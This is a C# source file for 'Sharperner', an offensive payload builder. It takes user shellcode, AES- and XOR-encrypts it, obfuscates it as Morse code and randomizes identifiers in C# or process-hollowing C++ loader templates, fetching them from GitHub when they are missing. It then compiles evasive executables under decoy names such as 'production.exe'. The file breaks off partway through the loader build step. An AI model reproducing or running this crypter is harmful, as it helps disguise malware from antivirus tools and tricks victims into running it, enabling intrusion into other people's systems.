using System;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace Sharperner
{
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER
    {
        public ushort e_magic;    // Magic number
        public ushort e_cblp;     // Bytes on last page of file
        public ushort e_cp;       // Pages in file
        public ushort e_crlc;     // Relocations
        public ushort e_cparhdr;  // Size of header in paragraphs
        public ushort e_minalloc; // Minimum extra paragraphs needed
        public ushort e_maxalloc; // Maximum extra paragraphs needed
        public ushort e_ss;       // Initial (relative) SS value
        public ushort e_sp;       // Initial SP value
        public ushort e_csum;     // Checksum
        public ushort e_ip;       // Initial IP value
        public ushort e_cs;       // Initial (relative) CS value
        public ushort e_lfarlc;   // File address of relocation table
        public ushort e_ovno;     // Overlay number
        public uint e_res1;       // Reserved
        public uint e_res2;       // Reserved
        public ushort e_oemid;    // OEM identifier (for e_oeminfo)
        public ushort e_oeminfo;  // OEM information; e_oemid specific
        public uint e_res3;       // Reserved
        public uint e_res4;       // Reserved
        public uint e_res5;       // Reserved
        public uint e_res6;       // Reserved
        public uint e_res7;       // Reserved
        public int e_lfanew;      // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS_COMMON
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS32
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS64
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER32
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public uint ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public uint SizeOfStackReserve;
        public uint SizeOfStackCommit;
        public uint SizeOfHeapReserve;
        public uint SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER64
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
    }

    static class ExeChecker
    {
        public static bool IsValidExe(string fileName)
        {
            if (!File.Exists(fileName))
                return false;

            try
            {
                using (var stream = File.OpenRead(fileName))
                {
                    IMAGE_DOS_HEADER dosHeader = GetDosHeader(stream);
                    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
                        return false;

                    IMAGE_NT_HEADERS_COMMON ntHeader = GetCommonNtHeader(stream, dosHeader);
                    if (ntHeader.Signature != IMAGE_NT_SIGNATURE)
                        return false;

                    if ((ntHeader.FileHeader.Characteristics & IMAGE_FILE_DLL) != 0)
                        return false;

                    switch (ntHeader.FileHeader.Machine)
                    {
                        case IMAGE_FILE_MACHINE_I386:
                            return IsValidExe32(GetNtHeader32(stream, dosHeader));

                        case IMAGE_FILE_MACHINE_IA64:
                        case IMAGE_FILE_MACHINE_AMD64:
                            return IsValidExe64(GetNtHeader64(stream, dosHeader));
                    }
                }
            }
            catch (InvalidOperationException)
            {
                return false;
            }

            return true;
        }

        static bool IsValidExe32(IMAGE_NT_HEADERS32 ntHeader)
        {
            return ntHeader.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC;
        }

        static bool IsValidExe64(IMAGE_NT_HEADERS64 ntHeader)
        {
            return ntHeader.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
        }

        static IMAGE_DOS_HEADER GetDosHeader(Stream stream)
        {
            stream.Seek(0, SeekOrigin.Begin);
            return ReadStructFromStream<IMAGE_DOS_HEADER>(stream);
        }

        static IMAGE_NT_HEADERS_COMMON GetCommonNtHeader(Stream stream, IMAGE_DOS_HEADER dosHeader)
        {
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
            return ReadStructFromStream<IMAGE_NT_HEADERS_COMMON>(stream);
        }

        static IMAGE_NT_HEADERS32 GetNtHeader32(Stream stream, IMAGE_DOS_HEADER dosHeader)
        {
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
            return ReadStructFromStream<IMAGE_NT_HEADERS32>(stream);
        }

        static IMAGE_NT_HEADERS64 GetNtHeader64(Stream stream, IMAGE_DOS_HEADER dosHeader)
        {
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
            return ReadStructFromStream<IMAGE_NT_HEADERS64>(stream);
        }

        static T ReadStructFromStream<T>(Stream stream)
        {
            int structSize = Marshal.SizeOf(typeof(T));
            IntPtr memory = IntPtr.Zero;

            try
            {
                memory = Marshal.AllocCoTaskMem(structSize);
                if (memory == IntPtr.Zero)
                    throw new InvalidOperationException();

                byte[] buffer = new byte[structSize];
                int bytesRead = stream.Read(buffer, 0, structSize);
                if (bytesRead != structSize)
                    throw new InvalidOperationException();

                Marshal.Copy(buffer, 0, memory, structSize);

                return (T)Marshal.PtrToStructure(memory, typeof(T));
            }
            finally
            {
                if (memory != IntPtr.Zero)
                    Marshal.FreeCoTaskMem(memory);
            }
        }

        const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;  // MZ
        const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00

        const ushort IMAGE_FILE_MACHINE_I386 = 0x014C;  // Intel 386
        const ushort IMAGE_FILE_MACHINE_IA64 = 0x0200;  // Intel 64
        const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664; // AMD64

        const ushort IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10B; // PE32
        const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B; // PE32+

        const ushort IMAGE_FILE_DLL = 0x2000;
    }
    public static class VisualStudioProvider
    {
        public static DirectoryInfo TryGetSolutionDirectoryInfo(string currentPath = null)
        {
            var directory = new DirectoryInfo(
                currentPath ?? Directory.GetCurrentDirectory());
            while (directory != null && !directory.GetFiles("Sharperner.sln").Any())
            {
                directory = directory.Parent;
            }
            
            return directory;
        }
    }

    //https://stackoverflow.com/questions/59248316/c-sharp-morse-decoder
    public class MorseForFun
    {
        private static Dictionary<char, string> _morseAlphabetDictionary;

        public static void InitializeDictionary()
        {
            _morseAlphabetDictionary = new Dictionary<char, string>()
                                   {
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
                                   };
        }

        public static string Send(string input)
        {
            StringBuilder stringBuilder = new StringBuilder();

            foreach (char character in input)
            {
                if (_morseAlphabetDictionary.ContainsKey(character))
                {
                    stringBuilder.Append(_morseAlphabetDictionary[character] + " ");
                }
                else
                {
                    stringBuilder.Append(character + " ");
                }
            }

            return stringBuilder.ToString();
        }
        public static string Receive(string input)
        {
            StringBuilder stringBuilder = new StringBuilder();

            string[] codes = input.Split(' ');

            foreach (var code in codes)
            {
                foreach (char keyVar in _morseAlphabetDictionary.Keys)
                {
                    if(_morseAlphabetDictionary[keyVar] == code)
                    {
                        stringBuilder.Append(keyVar);
                    }
                }
            }

            return stringBuilder.ToString();
        }
    }

    public static class Compile
    {
        public static void CompileWithMSBuild(string msBuildPath, string slnFile, string projectName)
        {
            var executablePath = $"\"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\"";

            if(string.IsNullOrEmpty(executablePath) || !executablePath.Contains("MSBuild.exe"))
            {
                Console.WriteLine("[!] MSBuild.exe executable not found in path");
                Environment.Exit(0);
            }

            var strCmd = $"/c {executablePath} {slnFile} /t:{projectName} /p:Configuration=Release /p:Platform=x64";

            using (Process compiler = new Process())
            {
                compiler.StartInfo.FileName = @"CMD.exe";
                compiler.StartInfo.Arguments = strCmd;
                compiler.StartInfo.UseShellExecute = false;
                compiler.StartInfo.CreateNoWindow = true;
                compiler.StartInfo.RedirectStandardError = true;
                compiler.Start();
            }
        }

        public static void CompileAssembly(string cscPath, string outputFile, string tempFile)
        {
            //compile the code
            //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.standarderror?redirectedfrom=MSDN&view=net-5.0#System_Diagnostics_Process_StandardError

            string strCmd = $"/c {cscPath} /out:{outputFile} {tempFile}";
            try
            {
                Process process = new Process();

                // Stop the process from opening a new window
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                // Setup executable and parameters
                process.StartInfo.FileName = @"CMD.exe";
                process.StartInfo.Arguments = strCmd;

                // Go
                process.Start();

                process.WaitForExit();

            }
            catch (Exception err)
            {
                Console.WriteLine($"[!] Error compiling template file with the following error {err.Message}");
            }
        }
    }

    class Program
    {
        public static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using(DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }

        public static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using(DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
            {
                dstream.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }

        private static bool IsBase64String(string base64)
        {
            base64 = base64.Trim();
            return (base64.Length % 4 == 0) && Regex.IsMatch(base64, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        public static bool IsHex(String s)
        {
            string strHex = String.Concat("[0-9A-Fa-f]{", s.Length, "}");
            bool RetBoolHex = Regex.IsMatch(s, strHex);
            return RetBoolHex;
        }

        private static Random random = new Random();

        public static string GetJuggledLetters(int length)
        {
            const string chars = "ABCDE!+FGHIJKLMNOPQRSTUVWXY!+Zabcdefghijklmnopqrs!+tuvwxyz0123456789!+";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static string GenerateRandomString()
        {
            int length = random.Next(8,15);
            var rString = "";
            for (var i = 0; i < length; i++)
            {
                rString += ((char)(random.Next(1, 26) + 64)).ToString().ToLower();
            }
            return rString;
        }

        public static string RandomKey(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static byte[] xorEncDec(byte[] input, string theKeystring)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }

        public static bool isBinary(string path)
        {
            long length = new FileInfo(path).Length;
            if (length == 0) return false;

            using (StreamReader stream = new StreamReader(path))
            {
                int ch;
                while ((ch = stream.Read()) != -1)
                {
                    if (isControlChar(ch))
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        public static bool isControlChar(int ch)
        {
            return (ch > Chars.NUL && ch < Chars.BS)
                || (ch > Chars.CR && ch < Chars.SUB);
        }

        public static class Chars
        {
            public static char NUL = (char)0; // Null char
            public static char BS = (char)8; // Back Space
            public static char CR = (char)13; // Carriage Return
            public static char SUB = (char)26; // Substitute
        }

        //https://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C
        //https://gist.github.com/RichardHan/0848a25d9466a21f1f38
        public static byte[] AESEncrypt(byte[] clearData, string aes_key, string aes_iv)
        {
            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = Convert.FromBase64String(aes_key);
            alg.IV = Convert.FromBase64String(aes_iv);

            CryptoStream cs = new CryptoStream(ms,
               alg.CreateEncryptor(), CryptoStreamMode.Write);

            // Write the data and make it do the encryption 
            cs.Write(clearData, 0, clearData.Length);

            cs.Close();

            byte[] encryptedData = ms.ToArray();

            return encryptedData;
        }

        //https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static byte[] GetRandomIV()
        {
            byte[] iv = new byte[16];

            for (int i = 0; i < 16; i++)
            {
                random.NextBytes(iv);
            }
            //StringBuilder IVStr = new StringBuilder(iv.Length);
            //foreach (byte b in iv)
            //{
            //    IVStr.AppendFormat("0x{0:x2}", b);
            //    if (!b.Equals(iv.Last()))
            //    {
            //        IVStr.Append(",");
            //    }
            //}
            //return IVStr.ToString();
            return iv;
        }

        public static byte[] GetRandomKey()
        {
            byte[] key = new byte[32];

            for (int i = 0; i < 32; i++)
            {
                random.NextBytes(key);
            }
            //StringBuilder IVStr = new StringBuilder(iv.Length);
            //foreach (byte b in iv)
            //{
            //    IVStr.AppendFormat("0x{0:x2}", b);
            //    if (!b.Equals(iv.Last()))
            //    {
            //        IVStr.Append(",");
            //    }
            //}
            //return IVStr.ToString();
            return key;
        }

        public static string GetMSBuildPath()
        {
            var cmd = "\"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath";
            var processInfo = new ProcessStartInfo("cmd.exe", $"/c {cmd}")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                WorkingDirectory = @"C:\Windows\System32\"
            };

            StringBuilder sb = new StringBuilder();
            Process p = Process.Start(processInfo);
            p.OutputDataReceived += (sender, a) => sb.AppendLine(a.Data);
            p.BeginOutputReadLine();
            p.WaitForExit();

            return(sb.ToString().Trim());
        }

        public static void banner()
        {
            string banner = @"
███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███████╗██████╗ ███╗   ██╗███████╗██████╗ 
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗
███████╗███████║███████║██████╔╝██████╔╝█████╗  ██████╔╝██╔██╗ ██║█████╗  ██████╔╝
╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝  ██╔══██╗
███████║██║  ██║██║  ██║██║  ██║██║     ███████╗██║  ██║██║ ╚████║███████╗██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  
by @ch4rm with <3
";
            Console.WriteLine(banner);
        }

        public static void help()
        {
            string help = @"
/file       B64,hex,raw 
/type       cs,cpp
/out        Output file Location (Optional)
/convert    File input. Embed PE to .NET Assembly using Manual Mapping

Example:
Sharperner.exe /file:file.txt /type:cpp
Sharperner.exe /file:file.txt /out:payload.exe
Sharperner.exe /convert:pe.exe
";
            Console.WriteLine(help);
        }

        static void Main(string[] args)
        {
            string base64String = "";
            string xorKey = GetJuggledLetters(18);
            string xorAesEncStringB64 = "";
            string rawB64Output = "";
            byte[] rawSh3lLc0d3 = new byte[] { };
            byte[] aesEncByte = new byte[] { };
            string morsed_aeskey = "";
            string morsed_aesiv = "";
            var filePath = "";
            var outputFile = "";
            var dropperFormat = "";

            // generate random aes key and iv
            string aes_key = Convert.ToBase64String(GetRandomKey());
            string aes_iv = Convert.ToBase64String(GetRandomIV());

            banner();

            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                else
                    arguments[argument] = string.Empty;
            }

            if (arguments.Count == 0)
            {
                Console.WriteLine("[!] No arguments supplied");
                help();
            }
            else if (arguments.ContainsKey("/file"))
            {
                if (!arguments.ContainsKey("/type"))
                {
                    Console.WriteLine("[!] Missing /type argument");
                }
                else if (arguments.ContainsKey("/convert"))
                {
                    Console.WriteLine("[!] /convert can't be used with /file and /type");
                }
                else if (string.IsNullOrEmpty(arguments["/file"]) || string.IsNullOrEmpty(arguments["/type"]))
                {
                    Console.WriteLine("[!] Empty input file or type");
                }
                else if (arguments["/type"].ToLower() != "cs" && arguments["/type"].ToLower() != "cpp")
                {
                    Console.WriteLine("[!] Invalid file type. Only cs or cpp are accepted");
                }
                else
                {
                    filePath = arguments["/file"];
                    dropperFormat = arguments["/type"].ToLower();

                    if (!File.Exists(filePath)) //if file exists
                    {
                        Console.WriteLine("[+] Missing input file");
                        Environment.Exit(0);
                    }
                    else
                    {
                        try
                        {
                            if (IsHex(File.ReadAllText(filePath)))
                            {
                                Console.WriteLine("[+] Hex payload detected.");
                                rawSh3lLc0d3 = StringToByteArray(File.ReadAllText(filePath));
                                aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                            }
                            else if (isBinary(filePath))
                            {
                                Console.WriteLine("[+] Raw payload detected.");
                                rawSh3lLc0d3 = File.ReadAllBytes(filePath);
                                aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                            }
                            else if (IsBase64String(File.ReadAllText(filePath)))
                            {
                                Console.WriteLine("[+] Base64 input detected. Converting base64 to bytes");
                                base64String = File.ReadAllText(filePath);
                                rawSh3lLc0d3 = Convert.FromBase64String(base64String);
                                aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                            }
                            else
                            {
                                Console.WriteLine("[!] Couldn't detect file input content.");
                                Environment.Exit(0);
                            }


                            Console.WriteLine($"[+] XOR encode shellcode with key: {xorKey}");

                            // XOR
                            byte[] xorAesEncByte = xorEncDec(aesEncByte, xorKey);

                            // back in the history
                            MorseForFun.InitializeDictionary();

                            //changes on the quotation
                            rawB64Output = Convert.ToBase64String(xorAesEncByte);
                            xorAesEncStringB64 = $"\"{MorseForFun.Send(rawB64Output)}\"";
                            morsed_aeskey = $"\"{MorseForFun.Send(aes_key)}\"";
                            morsed_aesiv = $"\"{MorseForFun.Send(aes_iv)}\"";
                            xorKey = $"\"{MorseForFun.Send(xorKey)}\"";


                            //temp
                            //xorAesEncStringB64 = string.Join("\"" + Environment.NewLine + "\"", xorAesEncStringB64.Split()
                            //.Select((word, index) => new { word, index })
                            //.GroupBy(x => x.index / 30)
                            //.Select(grp => string.Join(" ", grp.Select(x => x.word))));
                            //Console.WriteLine(xorAesEncStringB64);

                            Console.WriteLine("[+] Payload is now AES and XOR encrypted!");
                        }
                        catch
                        {
                            Console.WriteLine("[!] Error encrypting");
                        }

                    }

                    if (arguments.ContainsKey("/out"))
                    {
                        outputFile = arguments["/out"];
                        if (!Path.GetExtension(outputFile).Contains(".exe"))
                        {
                            outputFile = $"{outputFile}.exe";
                        }
                    }
                    else
                    {
                        // choose either one of these
                        string[] fileName = { "production.exe", "release.exe", "Release_x64.exe", "prod.exe", "config.exe", "buildGradle.exe", "build.exe" };
                        outputFile = fileName[random.Next(fileName.Length)];
                    }

                    // Write the file
                    var fullPath = "payload.dec";

                    using (StreamWriter writer = new StreamWriter(fullPath))
                    {
                        Console.WriteLine($"[+] Writing encoded base64 payload to {fullPath} just in case you need it");
                        writer.WriteLine(rawB64Output);
                    }

                    if (dropperFormat == "cs")
                    {
                        //https://stackoverflow.com/questions/5036590/how-to-retrieve-certificates-from-a-pfx-file-with-c

                        //Console.WriteLine($"XOR encrypted text: {xorAesEncStringB64}");

                        //decrypt it back

                        //byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xorAesEncStringB64), xorKey);

                        //string sh3Llc0d3 = DecryptStringFromBytes(aesEncrypted, key, iv);

                        //Console.WriteLine($"XOR decrypted text: {sh3Llc0d3}");

                        // Open template file
                        var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();

                        var parentDir = directory.FullName;

                        var templateFile = Path.Combine(parentDir, @"templates\template.cs");

                        var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");

                        string templateFileContent = "";

                        var cscPath = $"\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe\"";

                        if (File.Exists(cscPath))
                        {
                            Console.WriteLine("[!] csc.exe not found in path");
                        }
                        else
                        {
                            // read all content
                            if (!File.Exists(templateFile)) //if file exists
                            {
                                Console.WriteLine("[!] File does not exists in local, fetching online...");
                                ServicePointManager.Expect100Continue = true;
                                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                                WebClient client = new WebClient();
                                try
                                {
                                    templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/Sharperner/main/templates/template.cs");
                                }
                                catch
                                {
                                    Console.WriteLine("[!] No internet connection");
                                    Environment.Exit(0);
                                }
                            }
                            else
                            {
                                templateFileContent = File.ReadAllText(templateFile);
                            }

                            try
                            {
                                // randomize method names
                                var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
                                var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
                                Regex rg = new Regex(pattern);
                                MatchCollection methods = rg.Matches(templateFileContent);
                                foreach (var method in methods)
                                {
                                    if (!method.ToString().Contains("Main"))
                                    {
                                        var methodName = Regex.Match(method.ToString(), methodNamesPattern);
                                        templateFileContent = templateFileContent.Replace(methodName.ToString(), GenerateRandomString());
                                    }

                                }

                                //randomize variable names
                                string[] variableNames = { "xoredAesB64", "xorKey", "aE5k3y", "aE5Iv", "aesEncrypted", "sh3Llc0d3", "lpNumberOfBytesWritten", "processInfo",
                                                "pHandle", "rMemAddress", "tHandle", "ptr", "theKey", "mixed", "input", "theKeystring", "cipherText", "rawKey", "rawIV", "rijAlg", "decryptor",
                                                "msDecrypt", "csDecrypt", "srDecrypt", "plaintext", "cipherData", "decryptedData", "ms", "cs", "alg", "MorseForFun","startInfo","procInfo", "binaryPath",
                                                "random", "aes_key", "aes_iv", "stringBuilder"};

                                foreach (string variableName in variableNames)
                                {
                                    templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
                                }

                                // replace in template file
                                templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);

                            }
                            catch (Exception err)
                            {
                                Console.WriteLine($"[!] {err.Message}");
                            }

                            // write all back into the file
                            try
                            {
                                Console.WriteLine("[+] Writing shellcode to template file...");
                                File.WriteAllText(tempFile, templateFileContent);
                            }
                            catch (Exception err)
                            {
                                Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
                            }

                            Compile.CompileAssembly(cscPath, outputFile, tempFile);

                            Thread.Sleep(1000);

                            if (File.Exists(outputFile))
                            {
                                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                            }
                            else
                            {
                                Console.WriteLine("[!] Failed to compile code");
                            }

                            Console.WriteLine($"[+] Doing some cleaning...");

                            File.Delete(tempFile);

                            Thread.Sleep(1000);

                        }

                    }
                    else if (dropperFormat == "cpp")
                    {
                        // locate the file
                        var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();

                        if (directory == null)
                        {
                            Console.WriteLine("[!] Couldn't locate files. Exiting...");
                            Environment.Exit(0);
                        }

                        var parentDir = directory.FullName;

                        var rootFile = Path.Combine(parentDir, @"loader\loader.cpp");

                        var templateFile = Path.Combine(parentDir, @"templates\hollow.cpp");

                        var slnFile = Path.Combine(parentDir, @"Sharperner.sln");

                        var templateFileContent = "";

                        // read all content
                        if (!File.Exists(templateFile)) //if file exists
                        {
                            Console.WriteLine("[!] Template file does not exists in local, fetching online...");
                            ServicePointManager.Expect100Continue = true;
                            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                            WebClient client = new WebClient();
                            try
                            {
                                templateFileContent = client.DownloadString("https://gist.githubusercontent.com/aniqfakhrul/9d25308ee3666e5d2856e9e940df0297/raw/afed7f6e8479f933c2bad55efb138c93a7646881/hollow_sc.cpp");
                            }
                            catch
                            {
                                Console.WriteLine("[!] No internet connection");
                                Environment.Exit(0);
                            }
                        }
                        else
                        {
                            templateFileContent = File.ReadAllText(templateFile);
                        }

                        //create backup copy of the template
                        string temp = File.ReadAllText(rootFile);

                        // replace required values
                        try
                        {
                            //randomize variable names
                            string[] variableNames = { "morsed", "sh3llc0de", "decoded", "b64a3skey", "b64a3siv", "morsedb64a3skey", "morsedb64a3siv", "morsedxorKey", "xorKey",
                                                "x0rek3y", "ciphertext", "recovered", "policy", "explorer_handle", "hollow_bin", "pid", "bytesWritten", "p_size", "overwrite",
                                                "translated", "lines", "delim", "ascii_to_morse", "tokenize", "translate_morse", "get_PPID", "howlow_sc"};

                            foreach (string variableName in variableNames)
                            {
                                templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
                            }

                            templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);

                        }
                        catch
                        {
                            Console.WriteLine("[!] Error replacing values");
                        }

                        // write all back into the file
                        try
                        {
                            Console.WriteLine("[+] Writing shellcode to template file...");
                            File.WriteAllText(rootFile, templateFileContent);
                        }
                        catch (Exception err)
                        {
                            Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
                            Environment.Exit(0);
                        }

                        //compile with this
                        //"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe" C: \Users\REUSER\source\repos\ObfuscatorXOR\Sharperner\Sharperner.sln / t:loader

                        var msBuildPath = GetMSBuildPath();

                        if (string.IsNullOrEmpty(msBuildPath.ToString()))
                        {
                            Console.WriteLine("[!] Couldn't find MSBuild.exe location. Exiting...");
                        }
                        else
                        {
                            try
                            {

                                try
                                {
                                    Console.WriteLine($"[+] Compiling native C++ binary...");

                                    Compile.CompileWithMSBuild(msBuildPath, slnFile, "loader");
                                }
                                catch
                                {
                                    Console.WriteLine("[!] Error compiling. Exiting...");
                                    Environment.Exit(0);
                                }
                            }
                            catch (Exception err)
                            {
                                Console.WriteLine($"[!] {err.Message}");
                                Environment.Exit(0);
                            }

                            //wait for it to compile
                            Thread.Sleep(4000);

                            try
                            {
                                /*
                                File.Copy($"{parentDir}\\loader\\x64\\Release\\loader.exe", $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);

                                File.Delete($"{parentDir}\\loader\\x64\\Release\\loader.exe");

                                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                                    */
                                var loaderExecutableFilePath = Path.Combine(parentDir, @"loader\x64\Release\loader.exe");

                                try
                                {
